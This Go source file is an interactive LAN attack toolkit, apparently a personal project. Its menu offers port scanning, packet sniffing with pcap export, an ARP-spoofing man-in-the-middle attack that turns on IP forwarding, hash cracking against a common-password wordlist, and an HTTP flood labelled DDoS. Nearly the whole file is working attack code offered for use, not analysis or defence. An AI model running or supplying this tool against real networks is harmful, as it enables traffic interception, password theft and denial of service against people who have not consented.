package main

import (
	"bufio"
	"bytes"
	"crypto/md5"
	"crypto/sha256"
	"crypto/sha512"
	"errors"
	"fmt"
	"github.com/dspinhirne/netaddr-go"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/pcapgo"
	"github.com/stefanwichmann/lanscan"
	"github.com/turret-io/go-menu/menu"
	"golang.org/x/crypto/sha3"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

type device struct {
	//name       string
	ip       net.IP
	ipString string
	//macAddrEP  gopacket.Endpoint
	macAddrSet bool
	macAddr    net.HardwareAddr
}

type lan struct {
	subnet   *netaddr.IPv4Net
	nHostMax uint32
	//prefix   = myLAN.subnet.Netmask().PrefixLen()
}

type indexSpoof struct {
	IP     int
	HwAddr int
}

var (
	listOfDevices    []device
	myLAN            lan
	interf           net.Interface
	packetsCaptured  = make(map[string][]gopacket.Packet)
	packetsForExport []gopacket.Packet
	//portsConfidence      = make(map[string]int)
	block                sync.RWMutex
	defaultSerializeOpts = gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
)

// ////////////////////////INITIALIZE/////////////////////
func initializeMyDevice() {
	//listOfDevices debe ser 0, mi device debe ser siempre el primero.
	if len(listOfDevices) != 0 {
		println("Details of the main device exist already")
		os.Exit(1)
	}
	println("Getting your device info")
	var myDevice device

	//initialize hostname
	name, err := os.Hostname()
	if err != nil {
		os.Exit(1)
	}
	//myDevice.name = name

	//initialize ip version string
	ipplusprefix := lanscan.LinkLocalAddresses(name)[0]
	res := strings.Split(ipplusprefix, "/")
	myDevice.ipString = res[0]

	myDevice.ip = net.ParseIP(myDevice.ipString)

	command := "ip -o addr | awk '/" + myDevice.ipString + "/{print $2}'"
	//print(command)
	iface, e := exec.Command("bash", "-c", command).Output()
	if e != nil {
		print("Error finding IP's interface")
		os.Exit(1)
	}
	//iface has a new line character that must be removed
	iface = iface[:len(iface)-1]

	listIface, err := net.Interfaces()
	if err != nil {
		print("Error discovering interfaces")
		os.Exit(1)
	}

	for _, i := range listIface {
		if string(iface) == i.Name {
			interf = i
			continue
		}
	}

	//fmt.Println(interf.Name)
	//fmt.Println(interf.HardwareAddr.String())
	//os.Exit(1)
	myDevice.macAddr = interf.HardwareAddr
	myDevice.macAddrSet = true
	listOfDevices = append(listOfDevices, myDevice)

	myLAN.subnet, _ = netaddr.ParseIPv4Net(ipplusprefix)
}

func scanningLANHosts() {
	initializeLANHosts()
	networkInfo()
}

func initializeLANHosts() {
	println("Scanning LAN Hosts")
	var host device

	myLAN.nHostMax = myLAN.subnet.Len()
	listIPs := IPsLAN()
	ipsAlive := whoIsAlive(listIPs)

	for _, ip := range ipsAlive {
		if ip != listOfDevices[0].ipString {
			host.ipString = ip
			host.ip = net.ParseIP(ip)
			mac, _ := findMacOf(host.ip)
			/*if err != nil {
				fmt.Printf("There is no mac for %d \n", ip)
				//os.Exit(1)
			} else {*/
			host.macAddr = mac
			host.macAddrSet = true
			//}
			// try to add the hostname of the devices
			listOfDevices = append(listOfDevices, host)
		}
	}
}

// Gives back a slice with all the IPs of a LAN
func IPsLAN() []*netaddr.IPv4 {
	ip := strings.Split(myLAN.subnet.String(), "/")
	addr, _ := netaddr.ParseIPv4(ip[0])

	var listIPs []*netaddr.IPv4
	var i uint32 = 0

	listIPs = append(listIPs, addr)
	for i < myLAN.nHostMax-1 {
		listIPs = append(listIPs, listIPs[i].Next())
		i++
	}
	return listIPs
}

// finds all alive Hosts in a LAN
func whoIsAlive(listIPs []*netaddr.IPv4) []string {
	var ipsAlive []string
	i := 0
	thread := 0
	chanel := make(chan bool)
	returnedIpsChanel := make(chan string)

	//hecho de forma concurrente
	for i < len(listIPs)-1 {
		go isAlive(listIPs[i].String(), chanel, returnedIpsChanel)
		i++
		thread++
	}

	for thread > 0 {
		select {
		case <-chanel:
			thread--
		case ip := <-returnedIpsChanel:
			ipsAlive = append(ipsAlive, ip)
		}
	}
	return (ipsAlive)
}

func isAlive(ip string, chanel chan bool, ipchanel chan string) {
	answer, _ := exec.Command("ping", ip, "-c 3", "-i 5", "-w 5").Output()
	if !strings.Contains(string(answer), "Host Unreachable") {
		ipchanel <- ip
	}
	chanel <- true
}

// //////////////PORT SCANNING /////////////////////
// port scanning of an IP
func scanPorts(ip string, minPort int, maxPort int) {
	var wg sync.WaitGroup
	fmt.Printf("Scanning open ports of:  %v \n", ip)

	//thread := 0
	//channel := make(chan bool)

	wg.Add(maxPort - minPort + 1)
	for port := minPort; port <= maxPort; port++ {
		go testTcpConnection(ip, port /*, channel*/, &wg)
		//thread++
	}
	wg.Wait()

	/*for thread > 0 {
		<-channel
		thread--
	}*/
}

func portScanner(args ...string) error {
	var input, minP, maxP string
	minPort := 0
	maxPort := 1024
	//var listindex []int

	println("Enter the index number of the IP you want to scan ('all' for scanning all IPs, use '-' for ranges and separate with commas if you want to scan more than one. NO SPACES")
	fmt.Scanln(&input)

	println("Ports scanned are 0-1024 by default. Please, enter the min and max ports to scan. If you want either of two options to be the default, type 'd'")
	fmt.Scanln(&minP, &maxP)

	defer timer()()

	if minP != "d" {
		minPort, _ = strconv.Atoi(minP)
	}
	if maxP != "d" {
		maxPort, _ = strconv.Atoi(maxP)
	}

	listIndex := inputToNumberIndex(input)

	fmt.Printf("Scaning from port %d to port %d \n", minPort, maxPort)
	for _, i := range listIndex {
		scanPorts(listOfDevices[i].ipString, minPort, maxPort)
	}
	return nil
}

// func testTcpConnection(ip string, port int) {
func testTcpConnection(ip string, port int, wg *sync.WaitGroup /* chanel chan bool*/) {
	defer wg.Done()
	ipport := net.JoinHostPort(ip, strconv.Itoa(port))

	_, err := net.DialTimeout("tcp", ipport, time.Second*30)
	if err == nil {
		log.Printf("Port %d: Open\n", port)
	}
	//defer conn.Close()
	//chanel <- true
}

/////////////////////////SNNIFFING ///////////////////////

func sniffing(args ...string) error {
	var t, filtro, tC, nameFile /*, ports*/ string
	var /*listports,*/ listTargets []string
	var timeCapturing int

	println("Enter de index number of the IP (source host) you want to sniff ('all' for scanning all IPs, use '-' for ranges and separate with commas if you want to scan more than one. NO SPACES")
	fmt.Scanln(&t)

	listindex := inputToNumberIndex(t)
	for _, ind := range listindex {
		listTargets = append(listTargets, listOfDevices[ind].ipString)
	}

	println("Enter a filter, select 'default' or leave empty:")
	in := bufio.NewReader(os.Stdin)
	filtro, _ = in.ReadString('\n')
	if filtro == "default" {
		//filtro := "tcp and port dst 80"
		filtro = "tcp[13] == 0x11 or tcp[13] == 0x10 or tcp[13] ==0x18"
	}

	println("Enter how many time do you want to capture packets in seconds (60 seg by default): ")
	fmt.Scanln(&tC)
	if tC == "" {
		fmt.Println("Time capturing packets will be 60 seg")
		timeCapturing = 60
	} else {
		timeCapturing, _ = strconv.Atoi(tC)
	}

	println("If you want to export captured packets to a .pcap file, please enter file name. If not, leave empty:")
	fmt.Scanln(&nameFile)

	go capturePackets(filtro, listTargets)
	time.Sleep(time.Duration(timeCapturing) * time.Second)

	if nameFile != "" {
		nf := nameFile + ".pcap"
		file, e := os.Create(nf)
		if e != nil {
			print("Error creating .pcap file")
		}
		w := pcapgo.NewWriter(file)
		w.WriteFileHeader(uint32(1024), layers.LinkTypeEthernet)
		defer file.Close()

		for _, p := range packetsForExport {
			w.WritePacket(p.Metadata().CaptureInfo, p.Data())
		}
		fmt.Printf("Packages captured have been exported to %s \n", nf)
	}
	packetsForExport = packetsForExport[:0]
	fmt.Println("Sniffing ended. Select option 3 in the menu for showing the packets captured. ")
	return nil
}

func capturePackets(f string, listTargets []string) {
	//antes int32(320)
	handle, err := pcap.OpenLive(interf.Name, int32(1024), true, pcap.BlockForever)
	if err != nil {
		fmt.Println("Handle error")
		return
	}
	defer handle.Close()

	if f != "" {
		err = handle.SetBPFFilter(f)
		if err != nil {
			fmt.Println("Handle filter error")
			return
		}
	}

	source := gopacket.NewPacketSource(handle, handle.LinkType())
	fmt.Println("Capturing Packets")
	for packet := range source.Packets() {
		networkL := packet.NetworkLayer()
		if networkL == nil {
			continue
		}
		src := networkL.NetworkFlow().Src().String()
		if containsString(src, listTargets) {
			savePacket(packet)
			packetsForExport = append(packetsForExport, packet)
		}
	}
}

/////////////////////////SAVING PACKETS AND PRINTING THEM //////

func savePacket(packet gopacket.Packet) {
	var srcHost string
	networkLayer := packet.NetworkLayer()
	if networkLayer == nil {
		srcHost = "Other"
	} else {
		srcHost = networkLayer.NetworkFlow().Src().String()
	}
	packetsCaptured[srcHost] = append(packetsCaptured[srcHost], packet)
}

func printingPackets(listIndex []int) {

	for _, i := range listIndex {
		ip := listOfDevices[i].ipString
		packet := false
		fmt.Printf("Printing Packets from %s \n", ip)

		for src, listpackets := range packetsCaptured {
			if src == ip {
				packet = true
				for _, p := range listpackets {
					println(p.String())

					/*ethLayer := p.Layer(layers.LayerTypeEthernet)
					    	if ethLayer == nil {
						    	println("No eth layer")
						    }*/
					//ethPacket, _ := ethLayer.(*layers.Ethernet)
					//fmt.Println(ethPacket.SrcMAC)
				}
			}
		}
		if packet == false {
			fmt.Printf("There is no packets of %s as source. \n", ip)
		}
	}
}

func printPackets(args ...string) error {
	nHost := len(packetsCaptured)
	if nHost == 0 {
		println("No packets captured yet")
		return nil
	}

	var input string

	println("Enter the index number of the source hosts. Use '-' for ranges and commas if more than one. 'all' for display all:")
	fmt.Scanln(&input)

	//if interf == "p" volver a imprimir los hosts

	listIndex := inputToNumberIndex(input)
	//println(listindex)

	printingPackets(listIndex)

	/*	for _, i := range listindex {
		printingPackets(listOfDevices[i].ipString)
	}*/
	return nil
}

/////////////////////////MAN IN THE MIDDLE///////////////////

func ipforward(dat int) {
	if dat != 0 && dat != 1 {
		fmt.Println("Error ip forwarding")
		os.Exit(1)
	}
	file, err := os.OpenFile("/proc/sys/net/ipv4/ip_forward", os.O_RDWR, 0644)
	if err != nil {
		fmt.Println("Failed opening")
		os.Exit(1)
	}
	defer file.Close()

	if dat == 1 {
		_, err = file.WriteString("1")
	} else {
		_, err = file.WriteString("0")
	}

	if err != nil {
		fmt.Println("Failed writing")
		os.Exit(1)
	}

	dat2, err := os.ReadFile("/proc/sys/net/ipv4/ip_forward")
	if err != nil {
		fmt.Println("Failed reading")
		os.Exit(1)
	}

	res, _ := strconv.Atoi(string(dat2[0]))

	if res == 1 {
		fmt.Println("IP forwarding done.")
	} else if res == 0 {
		fmt.Println("IP forwarding undone.")
	} else {
		fmt.Println("Error2 ip forwarding")
		os.Exit(1)
	}
}

func add(ip net.IP, macaddr net.HardwareAddr) int {
	block.Lock()
	defer block.Unlock()

	for i, dev := range listOfDevices {
		if bytes.Equal([]byte(dev.ip), []byte(ip)) {
			if dev.macAddrSet == false {
				dev.macAddr = macaddr
				dev.macAddrSet = true
				return i
			}
			if !bytes.Equal([]byte(dev.macAddr), []byte(macaddr)) {
				println("Error, las mac no coinciden")
				log.Panic()
			}
		}
	}
	var dvc device
	dvc.ip = ip
	dvc.ipString = ip.String()
	dvc.macAddr = macaddr
	dvc.macAddrSet = true

	listOfDevices = append(listOfDevices, dvc)
	return len(listOfDevices)
}

func findMacOf(ip net.IP) (net.HardwareAddr, error) {
	var lineMatch = regexp.MustCompile(`([0-9\.]+)\s+dev\s+([^\s]+)\s+lladdr\s+([0-9a-f:]+)`)
	who := ip.To4().String()

	//técnicamente el ping existe, no hace falta comprobarlo.
	/*ping := exec.Command("ping", "-c1", "-t1", who)
	err:= ping.Start()
	if err != nil {
		return nil, err
	}
	err = ping.Wait()
	if err != nil {
		return nil, err
	}*/

	cmd := exec.Command("ip", "n", "show", who)
	out, err := cmd.Output()
	if err != nil {
		println("There is no MAC for ", who)
		return nil, err
	}

	matches := lineMatch.FindAllStringSubmatch(string(out), 1)
	// ver si interesa coger más datos
	if len(matches) > 0 && len(matches[0]) > 3 {
		macAddr, err := net.ParseMAC(matches[0][3])
		if err != nil {
			println("Error ParseMac", err)
		}
		return macAddr, nil
	}
	return nil, errors.New("Error")
}

func readARP(handle *pcap.Handle, stop chan struct{}) {
	//src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	src := gopacket.NewPacketSource(handle, handle.LinkType())
	in := src.Packets()

	for {
		var packet gopacket.Packet
		select {
		case <-stop:
			return
		case packet = <-in:
			savePacket(packet)
			packetsForExport = append(packetsForExport, packet)
			arpLayer := packet.Layer(layers.LayerTypeARP)
			if arpLayer == nil {
				continue
			}
			packet := arpLayer.(*layers.ARP)
			//si el emisor del paquete no soy yo
			if !bytes.Equal([]byte(interf.HardwareAddr), packet.SourceHwAddress) {
				continue
			}
			//guarda las ip y las mac en la tabla
			if packet.Operation == layers.ARPReply {
				//println("adding")
				add(net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress))
			}
			log.Println("ARP packet (%d): %v (%v) -> %v (%v)", packet.Operation, net.IP(packet.SourceProtAddress), net.HardwareAddr(packet.SourceHwAddress), net.IP(packet.DstProtAddress), net.HardwareAddr(packet.DstHwAddress))
		}
	}
}

func writeARP(handle *pcap.Handle, stop chan struct{}, indextarget1 int, indextarget2 int, spoof bool, waitInterval time.Duration) chan struct{} {
	var indSpoof1, indSpoof2 indexSpoof
	stoppedWriting := make(chan struct{})

	go func(stoppedWriting chan struct{}) {
		t := time.NewTicker(waitInterval)
		for {
			select {
			case <-stop:
				stoppedWriting <- struct{}{}
				return
			default:
				<-t.C
				if spoof {
					indSpoof1.IP = indextarget1
					indSpoof1.HwAddr = 0
					indSpoof2.IP = indextarget2
					indSpoof2.HwAddr = 0
				} else {
					indSpoof1.IP = indextarget1
					indSpoof1.HwAddr = indextarget1
					indSpoof2.IP = indextarget2
					indSpoof2.HwAddr = indextarget2
				}
				buf1, err1 := arpRequest(indSpoof1, indextarget2)
				buf2, err2 := arpRequest(indSpoof2, indextarget1)

				if err1 != nil {
					log.Println("NewARPRequest 1: ", err1)
					continue
				}
				if err2 != nil {
					log.Println("NewARPRequest 2: ", err2)
					continue
				}
				err1 = handle.WritePacketData(buf1)
				err2 = handle.WritePacketData(buf2)
				if err1 != nil {
					log.Println("WritePacketData 1: ", err1)
				}
				if err2 != nil {
					log.Println("WritePacketData 2: ", err2)
				}
			}
		}
	}(stoppedWriting)
	return stoppedWriting
}

func arpRequest(src indexSpoof, dst int) ([]byte, error) {
	ether, arp, err := newPacket(src, dst)
	if err != nil {
		return nil, err
	}
	arp.Operation = layers.ARPRequest

	buf := gopacket.NewSerializeBuffer()
	err = gopacket.SerializeLayers(buf, defaultSerializeOpts, &ether, &arp)
	if err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

func newPacket(src indexSpoof, dst int) (layers.Ethernet, layers.ARP, error) {
	ether := layers.Ethernet{
		EthernetType: layers.EthernetTypeARP,

		SrcMAC: listOfDevices[src.HwAddr].macAddr,
		DstMAC: listOfDevices[dst].macAddr,
	}
	arp := layers.ARP{
		AddrType: layers.LinkTypeEthernet,
		Protocol: layers.EthernetTypeIPv4,

		HwAddressSize:   6,
		ProtAddressSize: 4,

		SourceHwAddress:   []byte(listOfDevices[src.HwAddr].macAddr),
		SourceProtAddress: []byte(listOfDevices[src.IP].ip.To4()),

		DstHwAddress:   []byte(listOfDevices[dst].macAddr),
		DstProtAddress: []byte(listOfDevices[dst].ip.To4()),
	}
	return ether, arp, nil
}

func endmitm(handle *pcap.Handle, index []int) chan struct{} {
	fmt.Println("Restoring de ARPs")

	stopARP := make(chan struct{})
	go func() {
		t := time.NewTicker(time.Second * 5)
		<-t.C
		close(stopARP)
	}()
	//fmt.Printf("index %v %v,", index[0], index[1])
	return writeARP(handle, stopARP, index[0], index[1], false, 500*time.Millisecond)
}

func mitm(args ...string) error {
	var t1, t2, nameFile string

	fmt.Println("Please, enter the index number of the two targets: ")
	fmt.Scanln(&t1, &t2)
	target1, _ := strconv.Atoi(t1)
	target2, _ := strconv.Atoi(t2)

	println("If you want to export captured packets to a .pcap file, please enter file name. If not, leave empty:")
	fmt.Scanln(&nameFile)

	index := []int{target1, target2}

	ipforward(1)
	//println(index[0], index[1])

	handle, err := pcap.OpenLive(interf.Name, 65535, true, pcap.BlockForever)
	if err != nil {
		println("Error handle")
		os.Exit(1)
	}
	defer handle.Close()

	stop := make(chan struct{}, 2)

	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt)
	go func() {
		for range c {
			log.Println("'stop' signal received, stopping")
			close(stop)
		}
	}()

	go readARP(handle, stop)

	existsMac1 := listOfDevices[index[0]].macAddrSet
	existsMac2 := listOfDevices[index[1]].macAddrSet
	if !existsMac1 {
		fmt.Printf("There is no HwdAddr for %d \n: ", listOfDevices[index[0]].ipString)
		log.Panic()
	}
	if !existsMac2 {
		fmt.Printf("There is no HwdAddr for %d \n: ", listOfDevices[index[1]].ipString)
		log.Panic()
	}

	<-writeARP(handle, stop, index[0], index[1], true, time.Duration(0.1*10000.0)*time.Millisecond)

	<-endmitm(handle, index)
	ipforward(0)

	if nameFile != "" {
		nf := nameFile + ".pcap"
		file, e := os.Create(nf)
		if e != nil {
			print("Error creating .pcap file")
		}
		w := pcapgo.NewWriter(file)
		w.WriteFileHeader(uint32(1024), layers.LinkTypeEthernet)
		defer file.Close()

		for _, p := range packetsForExport {
			w.WritePacket(p.Metadata().CaptureInfo, p.Data())
		}
		fmt.Printf("Packages captured have been exported to %s \n", nf)
	}
	packetsForExport = packetsForExport[:0]
	return nil
}

/////////////////////////CRACKING/////////////////////

func detectHash(s string) string {
	lgt := len([]byte(s))
	var tipo string
	if lgt == 32 {
		println("Type detected: md5")
		tipo = "md5"
	} else if lgt == 64 {
		tipo = "sha256"
		println("Type detected: sha256")
	} else if lgt == 128 {
		tipo = "sha512"
		println("Type detected: sha512")
	} else {
		fmt.Println("Hash provided is not md5, sha256 or sha512, type not supported")
		os.Exit(1)
	}
	return tipo
}

func cracking(args ...string) error {
	var tipo, h, hash string
	fmt.Println("Please, enter the hash you want to crack: ")
	fmt.Scanln(&hash)

	fmt.Println("Please, enter your hash type if known: ")
	fmt.Println("OPTIONS: md5, sha256, sha512, leave empty if unknown")
	fmt.Scanln(&tipo)
	//hash := "77f62e3524cd583d698d51fa24fdff4f"
	//hash := "95a5e1547df73abdd4781b6c9e55f3377c15d08884b11738c2727dbd887d4ced"
	//hash = fmt.Sprintf("%x", sha3.Sum512([]byte(hash)))

	if tipo == "" {
		tipo = detectHash(hash)
	} else if tipo != "md5" && tipo != "sha256" && tipo != "sha512" {
		println("Incorrect/non suported hash type")
		return nil
	}

	found := false
	txt, err := os.Open("10-million-password-list-top-1000000.txt")
	if err != nil {
		println("Error opening wordlist")
		os.Exit(1)
	}
	defer txt.Close()

	scanner := bufio.NewScanner(txt)
	for scanner.Scan() {
		pass := scanner.Text()

		if tipo == "md5" {
			h = fmt.Sprintf("%x", md5.Sum([]byte(pass)))
			if h == hash {
				found = true
				fmt.Printf("[+] Password found (MD5): %s\n", pass)
				break
			}
		} else if tipo == "sha256" {
			h = fmt.Sprintf("%x", sha256.Sum256([]byte(pass)))
			if h == hash {
				found = true
				fmt.Printf("[+] Password found (SHA-256): %s\n", pass)
				break
			}
			h = fmt.Sprintf("%x", sha3.Sum256([]byte(pass)))
			if h == hash {
				found = true
				fmt.Printf("[+] Password found (SHA3-256): %s\n", pass)
				break
			}
		} else {
			h = fmt.Sprintf("%x", sha512.Sum512([]byte(pass)))
			if h == hash {
				found = true
				fmt.Printf("[+] Password found (SHA-512): %s\n", pass)
				break
			}
			h = fmt.Sprintf("%x", sha3.Sum512([]byte(pass)))
			if h == hash {
				found = true
				fmt.Printf("[+] Password found (SHA3-512): %s\n", pass)
				break
			}
		}
	}
	err = scanner.Err()
	if err != nil {
		fmt.Printf("Error: ", err)
		return err
	}
	if !found {
		fmt.Printf("No coincidence found for: %s \n", hash)
	}
	return nil
}

//////////////////////////// DDoS //////////////////////////////

func ddos(args ...string) error {
	var threads int
	var ipindex, port, url, t string
	var once sync.Once

	fmt.Println("Please, enter the IP and the port you want to attack: ")
	fmt.Scanln(&ipindex, &port)

	fmt.Println("Please, enter the number of messages you want to send to the url for the attack: ")
	fmt.Scanln(&t)

	if t != "" {
		threads, _ = strconv.Atoi(t)
	} else {
		threads = 50000
	}

	i, _ := strconv.Atoi(ipindex)
	ip := listOfDevices[i].ipString

	if port != "" {
		url = "http://" + ip + ":" + port
	} else {
		url = "http://" + ip
	}

	fmt.Printf("Starting DDoS attack to %v \n", url)
	var wg sync.WaitGroup
	wg.Add(threads)
	for i := 0; i < threads; i++ {
		go runddos(url, &once, &wg)
		fmt.Printf("\r [%.0f] messages out of %d have been sent", float64(i+1), threads)
	}

	wg.Wait()
	println("\n The attack has been completed")

	return nil
}

func runddos(url string, once *sync.Once, wg *sync.WaitGroup) {
	defer wg.Done()
	connection := func() {
		fmt.Println(" \n Connection down \n ")
	}
	resp, err := http.Get(url)

	if err == nil {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	} else {
		once.Do(connection)
	}
}

// ////////////////////////////NETWORK  INFO ///////////////////
func networkInfo(args ...string) error {
	println("Your network is: ", myLAN.subnet.String())

	println("These are the devices alive in your network:")
	fmt.Println("Index Number		IP			HwAddr")
	for i, dev := range listOfDevices {
		if i == 0 {
			fmt.Printf("%d (you)			%s		%s \n", i, dev.ipString, dev.macAddr.String())
		} else {
			fmt.Printf("%d			%s		%s \n", i, dev.ipString, dev.macAddr.String())
		}
	}
	println(" ")
	return nil
}

// /////////////////////////////RESCAN LAN /////////////////////////////
func rescan(args ...string) error {
	listOfDevices = listOfDevices[:1]
	scanningLANHosts()

	return nil
}

///////////////////AUXILIAR FUNCTIONS ///////////////////

func inputToNumberIndex(s string) []int {
	var listindex []int
	maxdev := len(listOfDevices)

	if s == "all" {
		for i, _ := range listOfDevices {
			listindex = append(listindex, i)
		}
		return listindex
	}

	ips := strings.Split(s, ",")
	for _, i := range ips {
		if strings.Contains(i, "-") {
			interv := strings.Split(i, "-")
			j, _ := strconv.Atoi(interv[0])
			sup, _ := strconv.Atoi(interv[1])
			for j < sup+1 {
				if j >= maxdev {
					fmt.Printf("There is not an IP with index number %d. This index has been discarted. \n", j)
				} else {
					listindex = append(listindex, j)
				}
				j++
			}
		} else {
			ind, _ := strconv.Atoi(i)
			if ind >= maxdev {
				fmt.Printf("There is not an IP with index number %d. This index has been discarted. \n", ind)
			} else {
				listindex = append(listindex, ind)
			}
		}
	}
	return listindex
}

func containsString(s string, l []string) bool {
	for _, x := range l {
		if s == x {
			return true
		}
	}
	return false
}

func timer() func() {
	start := time.Now()
	//fmt.Printf("start: %v\n", start.String())
	return func() {
		//println("func")
		//fmt.Printf("start func: %v\n", start.String())
		fmt.Printf("Time took: %v\n", time.Since(start))
	}
}

/////////////////////MENU AND MAIN////////////////////

func displaymenu() {
	commandOptions := []menu.CommandOption{

		menu.CommandOption{"1", "Scan for open ports", portScanner},
		menu.CommandOption{"2", "Capture packets from a host", sniffing},
		menu.CommandOption{"3", "Show captured packets (if any)", printPackets},
		menu.CommandOption{"4", "Run Man in the Middle", mitm},
		menu.CommandOption{"5", "Crack a password", cracking},
		menu.CommandOption{"6", "DDoS on an URL", ddos},
		menu.CommandOption{"7", "Show your LAN's hosts", networkInfo},
		menu.CommandOption{"8", "Rescan and update your LAN", rescan},
	}

	menuOptions := menu.NewMenuOptions("Enter your choice. 'menu' for returning to main menu > ", 0)

	menu := menu.NewMenu(commandOptions, menuOptions)
	menu.Start()
}

func main() {
	initializeMyDevice()
	scanningLANHosts()
	displaymenu()
}
